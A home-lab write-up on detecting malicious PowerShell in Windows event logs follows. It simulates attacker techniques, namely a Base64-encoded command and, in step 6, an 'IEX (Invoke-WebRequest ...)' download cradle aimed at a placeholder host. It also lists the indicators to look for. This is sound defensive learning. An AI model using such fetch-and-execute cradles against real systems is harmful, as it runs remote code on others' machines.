# Malicious PowerShell/Command Detection
**Date Created:** January 13, 2026   
**Last Updated:** January 13, 2026 

## **Skills Demonstrated:**
- Detecting suspicious PowerShell and command-line activity
- Understanding common attacker PowerShell techniques
- Analyzing Windows Event Logs for process execution
- Identifying living off the land (LOLBins) abuse
- Correlating commands with potential attacker intent
- Basic threat hunting mindset

## **Objective:**
- Learn how attackers abuse PowerShell and built-in Windows commands
- Identify indicators of malicious or suspicious command execution
- Understand which Windows logs capture PowerShell and process activity
- Practice distinguishing legitimate admin activity from attacker behaviour

## **Tools & Environment:**
- Windows 11 Pro VM
- Windows Event Viewer
    - Security Log
    - PowerShell Operational Log
- PowerShell
- Commands and tools:
    - Get-WinEvent
    - Get-EventLog
    - powershell.exe
    - cmd.exe
- Example attacker techniques:
    - Encoded PowerShell commands
    - Suspicious parent/child process relationships

## **Steps:**
1. Open the Win 11 VM and verify PowerShell Operational and Security logs are available in Event Viewer prior to executing test commands for this lab.
    - Log in as admin
    - Open Event Viewer
    - Navigate to Applications and Services Logs -> Microsoft -> Windows -> PowerShell -> Operational
    - Then Navigate to Windows Logs -> Security
    - Confirm PowerShell logging is enabled
        - Event ID's like 4103 / 4104 should be already visible. If not, note it.
2. Execute standard administrative PowerShell commands to establish a baseline of normal PowerShell activity and corresponding event logs.
    - In PowerShell, run the following and then close PowerShell
        - Get-Process
        - Get-Service
        - whoami
3. Review PowerShell Operational logs and confirm baseline commands were logged as clear text script blocks with no obfuscation of suspicious indicators.
    - Refresh Operational logs and look for 4103 or 4104 Event ID's.
        - In my case, we do not have newly created logs. 
4. Simulate attacker behaviour by executing a Encoded PowerShell command using the -Encoded Command flag to generate suspicious PowerShell activity for analysis.
    - Write the following into PowerShell. Hit enter after each line to input the next line
        - $cmd = 'Write-Output "Totally not malware"'
        - $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
        - $encoded = [Convert]::ToBase64String($bytes)
        - $encoded
    - Copy the Base64 output and use it to execute like an attacker
        - In PowerShell run powershell.exe -EncodedCommand <PASTE_BASE64_HERE>
5. Identify encoded PowerShell execution within Event ID 4104, observe Base64 encoded command content indicative of obfuscation techniques commonly used by attackers.
    - Go back to Event Viewer and look for Event ID's 4104
    - Look for a script block containing Encoded Command and Base64 blob instead of readable commands.
    - No new PowerShell Script Bock Logging events were created following execution of encoded PowerShell commands. 
6. Execute a simulated PowerShell download cradle using Invoke-WebRequest and IEX to replicate common malware execution patterns without retrieving actual Malicious content
    - In PowerShell, run powershell.exe -Command "IEX (Invoke-WebRequest http://example.com/fake.ps1)"
    - Even if this fails, it's fine for this lab.
7. Check PowerShell activity with Security Event ID 4688 to analyze process creation details, including suspicious command line arguments and parent child process relationships.
    - Go to Event Viewer -> Security Log
    - Filter for Event ID 4688
    - Look for the following:
        - Parent process: 
        - Chile process or command line arguments
        - Presence of: -EncodedCommand, Invoke-WebRequest, IEX

## **Notes:**
- Interactive PowerShell commands executed directly in the console did not generate new PowerShell Script Block Logging events (4104) on this standalone Win 11 VM. This behaviour highlights limitations in PowerShell telemetry availability in non domain environments.
- Despite successful execution of encoded and non interactive PowerShell commands, no new Event ID 4104 entries were generated in the PowerShell Operational log on this standalone Windows 11 Pro system. This indicates a limitation in script block telemetry availability in this environment.

## **Issues & Fixes:**
- No configuration changes were applied, as the absence of new PowerShell Operation events was consistent across multiple tests.

## **Outcome:**
- Attempted to detect and analyze malicious PowerShell execution techniques, including encoded commands and download cradles, by correlating PowerShell Operational and Security event logs to infer attacker intent. Unfortunately Win 11 standalone VM blocks logging events of these types unless it's domain joined and ability to adjust configurations is allowed. 
